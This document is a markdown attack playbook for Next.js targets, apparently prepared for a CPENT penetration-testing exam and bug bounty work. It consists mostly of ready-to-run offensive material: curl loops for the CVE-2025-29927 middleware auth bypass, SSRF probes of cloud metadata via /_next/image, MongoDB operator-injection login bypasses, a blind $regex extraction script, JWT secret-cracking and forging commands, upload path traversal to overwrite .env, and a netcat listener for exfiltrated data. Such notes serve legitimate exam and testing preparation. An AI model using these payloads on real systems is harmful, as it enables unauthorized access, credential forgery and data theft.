# Next.js attack surface — deep reference (CPENT web zone + real-world)

Built for the web zone's Next.js targets (prior exam: Next.js 16.2.7 + MongoDB +
HS256 JWT). Covers fingerprinting, the CVEs that actually pay out in exams and
bug bounty, NoSQL weaponization, and the admin-JWT-gate playbook (§13) for the
class of target that cost 3 answers last attempt. Pair with
[web-scrape.md](web-scrape.md) — mirror first, then hunt offline.
Load with: `ctf-web`. Prior findings: `~/Documents/CPENT/Notes/review_notes/CPENT_Web_Range_Report.md`.

## 1. Fingerprinting & version pinning

| Signal | Where |
|---|---|
| `x-powered-by: Next.js` / `x-nextjs-cache`, `x-nextjs-prerender` | response headers |
| `/_next/static/<buildId>/` chunks, `__NEXT_DATA__` script blob (Pages Router), self.`__next_f` pushes (App Router RSC) | HTML source |
| Build ID | `/_next/static/<BUILD_ID>/buildManifest.js` — retry later: build ID rotates per deploy |
| Version | leaked `package.json`/source maps, `/api/health` style debug endpoints (prior exam leaked `next version`), `next` in JS chunk comments, error pages |
| Router type | `/_next/static/chunks/app/` (App Router) vs `pages/` paths; `?_rsc=` accepted = RSC enabled |

```bash
curl -sk https://host/ | grep -oE '(_next/static/[A-Za-z0-9_-]+|__NEXT_DATA__|self.__next_f)' | sort -u
curl -sk https://host/api/health          # common debug leak: node_env, versions, db info
curl -sk https://host/robots.txt
```

## 2. The two CVEs that pay

### CVE-2025-29927 — middleware authorization bypass
The middleware re-executes itself when it sees `x-middleware-subrequest`,
letting an attacker "consume" the auth check and return the rewrite without it.
Affected: <14.2.25, 15.0.0–15.2.2 (backports exist for 12/13). Test ALL values —
the correct one depends on middleware location/version:

```bash
for v in "middleware" "src/middleware" "pages/_middleware" "src/pages/_middleware" \
         "middleware:middleware:middleware:middleware:middleware"; do
  curl -sk -H "x-middleware-subrequest: $v" -o /dev/null -w "$v -> %{http_code}\n" \
    https://host/admin/
done
```
Impact: admin dashboards, `/api/admin/*` gates, IP allowlists implemented in
middleware — exactly the pattern guarding exam questions 48–50. If the target
is patched (prior exam was, 16.2.7), move on fast; if not, this is the intended
path. Detection: response changes (403→200, redirect→content).

### CVE-2024-34351 — SSRF via Server Actions
Server Actions resolving redirects honor the attacker-controlled `Host` header.
Craft a request where a server action triggers a fetch → 302 to `/<your-path>`;
Next resolves the redirect against your Host, sending the request body
(including file contents in RSC encoding) to YOUR server. Requirements: a
server action that fetches, host-header control. Exfil endpoint: `nc -lvnp 80`.

## 3. Image optimizer SSRF — `/_next/image`

`/_next/image?url=<target>&w=16&q=1` fetches remote or relative URLs server-side:

```bash
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
  'https://host/_next/image?url=http://169.254.169.254/latest/meta-data/&w=16&q=1'
```
- Errors differ for reachable/unreachable → internal port scanner.
- `remotePatterns` allowlist bypass: match on hostname wildcard bugs, URL
  parsers differing (userinfo `http://allowed@internal/`, dots/dashes, encodings).
- Some versions leak internal content-type/size but not body — still an oracle
  for metadata endpoints and internal service fingerprinting.

## 4. Server Actions abuse (beyond SSRF)

- Forms POST with hidden `$ACTION_ID_<hash>` fields — enumerate action IDs from
  the mirrored RSC payload; invoke actions directly without the UI.
- Actions accept structured args (`$K1`, arrays, objects) — try type confusion.
- **Upload actions concatenating user fields into paths** — the prior exam's
  `/api/upload` `type=../../etc` arbitrary write. Probe EVERY multipart field
  name for path traversal; filename extension whitelists are usually enforced
  on a different field than directory components.

## 5. Build artifacts, source maps, RSC payloads

- `.map` files: `/_next/static/chunks/<name>.js.map` → full original source,
  API keys, comments, internal hostnames. Unpack: `npx shuji` (run from
  /tmp/opencode per hygiene rules) or python `sourcemap` lib.
- `/_next/static/<id>/_buildManifest.js` and `_ssgManifest.js` → hidden routes.
- App Router RSC data: `curl -H 'RSC: 1' https://host/path` (and `?_rsc=`) —
  server component props/JSON without HTML; often includes data the UI filters.
- `__NEXT_DATA__` (Pages Router): props, page props, user objects, feature flags.
- Enumerate: chunk files are deterministic names — `ffuf -u https://host/_next/static/FUZZ -w chunklist` seeded from mirrored HTML.

## 6. Auth patterns (NextAuth / Auth.js / custom JWT)

- Weak `NEXTAUTH_SECRET`/JWT secret → forge session cookies. Crack:
  `john jwt.txt --wordlist=<wl> --format=HMAC-SHA256` (toolkit.md §8). If
  wordlists fail, **hunt the secret on the other in-scope host** (.env, git,
  config, report files) — the prior exam's unanswered gate.
- NextAuth catch-all `/api/auth/[...nextauth]` — probe providers, `signin`,
  `session`, `csrf`; account-linking and `allowDangerousEmailAccountLinking`.
- Custom middleware role checks: `role`/`is_admin` claims — try mass assignment
  at register AND profile-update endpoints (prior exam: rejected, but always test).
- OAuth code/confused-deputy if custom callback handling.

## 7. Cache & routing tricks

- **Client router cache poisoning**: prefetched RSC responses cached per-URL;
  a served-stale or poisoned prefetch can persist in the victim browser —
  matters for XSS-to-session combos.
- **ISR/error cache**: error responses sometimes cached with attacker content
  (cache poisoning family; test `x-nextjs-cache`, `cache-control` handling).
- Middleware-set headers `x-middleware-override`, `x-middleware-request-*` —
  echo/inject them; some deployments route on them.
- Redirect/rewrite leaks in `next.config` → `/api/proxy`-style rewrites
  exposing internal hostnames — enumerate via the manifest and try the upstream
  path on the public host.
- Open redirect via `next/navigation` router push on user input, `/_next/image`
  redirect chains.

## 8. Real-world checklist (bug-battery order)

1. Mirror + source maps (web-scrape.md) → secrets, internal hosts, action IDs.
2. Version pin → CVE-2025-29927 battery (all 5 header values).
3. `_next/image` SSRF/port-scan + allowlist bypass.
4. API enumeration from manifests + `RSC: 1` data pull + arjun params.
5. Auth: JWT structure decode → secret hunt → mass-assignment → NextAuth probes.
6. Server Actions: direct invocation, arg fuzzing, upload path traversal.
7. Cache poisoning: error pages, prefetch, ISR revalidation endpoints.
8. NoSQL/Mongo operators on every search/filter param (`[$ne]`, `[$regex]`,
   `[$where]`), verbose error harvesting (index/collection names).
9. Username enumeration via register/login/reset oracles.
10. `middleware.ts` logic flaws when source is exposed in maps — read the exact
    auth condition and target its gaps (path confusion, trailing slashes,
    case, encoded chars, locale prefixes).

## 9. Prior-exam mapping (what to redo better next attempt)

| Prior finding | Next-step file |
|---|---|
| Upload `type` traversal write confirmed | escalate: overwrite config/chunk → code exec, or write into served dir |
| `/api/health` leaks (node_env, 11 collections) | enumerate collections via NoSQL errors + operator injection |
| JWT `is_admin` gate, secret not cracked | secret hunt on 10.10.1.111 (LFI there reads arbitrary files: `.env`, deployment configs) |
| CVE-2025-29927 patched at 16.2.7 | verify patch per-route; middleware file may still contain logic flaws |
| Username enum via register | chain into reset-password/invite flows |

## 10. NoSQL injection — the underused primitive (prior exam CONFIRMED it)

Operator injection was confirmed on `/api/search` (`type[$ne]=x`) but never
weaponized. Three escalations, in value order:

**(a) Login bypass.** If `/api/auth/login` passes the JSON body into a Mongo
query uncast:
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": ""}}
```
Each known username (`deathfreezer`, `CodeInVR`, …) + `$ne` password. Landing
as ANY admin-flagged user ends the gate without the JWT secret.

**(b) Collection pivoting.** If the `type` field selects the collection
(`db.collection(type).find(query)`), `type[$ne]=x` proving it means EVERY
collection is readable through `/api/search`. Enumerate: `test`, `users`,
`tickets`, `backups`, `keys`, `documents`, `incidents`. The three gated
answers (ticket doc, SSH passphrase, override key) are DATA — they may live in
a collection the search can reach directly.

**(c) Blind $regex extraction.** When responses differ by match/no-match,
extract any field char-by-char:
```python
import requests, string
URL = "https://host/api/search"
known = ""
while True:
    for c in string.printable:
        r = requests.get(URL, params={"search": "*", "type[$regex]": f"^{known+c}"})
        if MATCH_CONDITION(r):      # define from a known-true/known-false pair
            known += c; print(known); break
    else: break
```
Adapt the injection point (`search[$regex]`, `username[$regex]`, header
fields) and oracle (row count, reflected text, timing).

**(d) Update-operator injection.** `/api/profile/update` — if the body is
passed to `updateOne(filter, {$set: body})`, send `{"is_admin": true}` (mass
assignment, tried + rejected) BUT ALSO nested operators:
`{"profile.$[].role": "admin"}`, `{"$where": "..."}` — whitelists often check
top-level keys only.

## 11. The gate questions are FILES — check static delivery first

The three gated answers were a `.md` ticket, an SSH key, a `.zip`. Before
fighting the API for them:
1. **robots.txt paths were never fetched in the prior attempt**
   (`/sys/kernel/ /core/ /data/ /player/ /dev-studio/ /profile/`) — GET each,
   ffuf each directory (raft-medium), with and without the user JWT. "Admin"
   pages are often gated while their ASSETS are served statically.
2. Guess direct object URLs from the question text itself:
   `TKT-TKT-004_Emergency_Staging.md`, `incident_rep_master.zip`,
   `kwame_id_rsa` under every discovered dir + `/uploads/` + `/data/`.
3. The upload primitive writes files server-side — anything the app serves
   from disk (including other tenants' uploads) may be readable by naming it:
   `download.php?file=`-style handlers and `/_next/image?url=/uploads/...`
   local-path reads.
4. Enumerate concrete routes under `/api/admin/` — a catch-all checks the JWT,
   but concrete handlers sometimes exist OUTSIDE the catch-all
   (`/api/files/<name>`, `/api/tickets/<id>`) with weaker checks. Feed ffuf
   with words from the mirrored JS + the question text.

## 12. JWT gate — full secret-recovery battery (when cracking fails)

Ordered by hit rate:
1. **Bundles first:** Next.js inlines `process.env.X` VALUES at build time in
   CLIENT components — grep all mirrored JS for `JWT_SECRET`, `SECRET`,
   `NEXTAUTH_SECRET`, `MONGO`, `SECRET_KEY` — not just `NEXT_PUBLIC_`
   variables. (The prior attempt never scraped the bundles — web-scrape.md.)
2. **Source maps** (`§5`) → original `.ts` often contains the env var name and
   sometimes a fallback literal default (`process.env.SECRET || "dev-secret"`).
3. **Other in-scope hosts:** the .111 LFI reads arbitrary files — use it to
   read the Next.js host's exported NFS/deployment shares if reachable, and
   its own `.env` files for pattern-matching secrets (same devs reuse).
4. **Header tricks:** `kid` header injection (if the app trusts `kid` to pick
   the key, `{"kid":"x"}` + errors reveal lookup path); RS→HS confusion if a
   JWKS exists (`/.well-known/jwks.json`) — sign HS256 using the published
   public key as the HMAC secret.
5. **Arbitrary write escalation:** the upload traversal can overwrite
   `.env`/config if the app restarts (serverless cold-starts DO re-read env).
   Payload: write `.env` containing your own `JWT_SECRET=<chosen>` then wait/
   trigger. Lower probability on a persistent VM — timebox it.
6. **Verify every candidate instantly:**
   `python3 -c "import jwt;print(jwt.encode({'role':'admin','is_admin':True},'<candidate>',algorithm='HS256'))"`
   then replay the cookie against `/api/admin/dashboard`. (pyjwt verified
   installed on this laptop.)

## 13. THE ADMIN-JWT-GATE PLAYBOOK (ordered — run top to bottom, one step at a time)

The exact pattern of the 3 unanswered questions (Next.js + Mongo + HS256 JWT +
admin catch-all). Steps 1-4 are cheap; 5-8 are the weaponized chains.

1. **Scrape everything** (web-scrape.md): mirror, all JS chunks, source maps,
   waymore history. THEN grep: `JWT|SECRET|process.env|mongodb://|api/` —
   build the endpoint + env-var inventory offline. (~15 min)
2. **Static delivery check** (§11): robots paths + guessed object filenames
   (`TKT-TKT-004_Emergency_Staging.md`, `incident_rep_master.zip`,
   `kwame*`), with and without user JWT. Answers may be plain static files.
3. **CVE-2025-29927 battery** (§2) — all five header values against the admin
   routes and the robots paths.
4. **Login bypass via NoSQL operators** (§10a) on every enumerated username.
5. **Collection pivot + blind extraction** (§10b/c) through `/api/search`'s
   confirmed injection — target `users` (roles), `tickets`, `backups`,
   `keys`, `incidents` collections.
6. **Admin surface enumeration** (§11.4): concrete routes outside the
   catch-all; ffuf with JS-vocabulary wordlist.
7. **JWT battery** (§12): bundles → maps → other-host LFI → kid/JWKS →
   write-.env escalation. Forge + verify after EVERY candidate.
8. **Update-operator injection** (§10d) on `/api/profile/update`.

Record each step's result in the state file before the next (operating
contract). If all eight fail: the gate is the exam's "hard 300" — bank the
other 4700 points first, return with remaining time.
